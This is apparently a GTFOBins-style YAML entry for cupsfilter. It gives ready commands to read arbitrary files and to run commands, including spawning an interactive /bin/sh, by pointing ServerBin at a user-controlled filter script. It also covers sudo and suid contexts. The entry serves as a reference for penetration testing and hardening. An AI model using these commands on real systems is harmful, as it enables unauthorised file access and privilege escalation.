---
functions:
  file-read:
    - code: |
        cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
      contexts:
        sudo:
        suid:
        unprivileged:
  shell:
    - description: |
        The `-c` flag allows specifying a custom `cups-files.conf` to redirect `ServerBin` to a user-controlled directory. By placing a filter script (like `gziptoany`) in that directory, arbitrary commands can be executed.
      code: |
        COMMAND='id'
        WORKDIR=$(mktemp -d)
        mkdir -p "$WORKDIR/cups/filter"
        printf '#!/bin/sh\n%s\n' "$COMMAND" > "$WORKDIR/cups/filter/gziptoany"
        chmod +x "$WORKDIR/cups/filter/gziptoany"
        printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
        cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null
    - description: |
        Spawning an interactive system shell using the `ServerBin` redirection technique.
      code: |
        WORKDIR=$(mktemp -d)
        mkdir -p "$WORKDIR/cups/filter"
        printf '#!/bin/sh\nexec /bin/sh' > "$WORKDIR/cups/filter/gziptoany"
        chmod +x "$WORKDIR/cups/filter/gziptoany"
        printf 'ServerBin %s/cups\nDataDir /usr/share/cups' "$WORKDIR" > "$WORKDIR/cups-files.conf"
        cupsfilter -c "$WORKDIR/cups-files.conf" -i text/plain -m text/plain /dev/null 2>/dev/null
  sudo:
    - description: |
        The file read primitive works directly via sudo. For command execution, `cupsfilter` calls `_cupsFileCheck` when running as root, requiring the custom config file to be owned by root.
      code: |
        sudo cupsfilter -i application/octet-stream -m application/octet-stream FILE
...
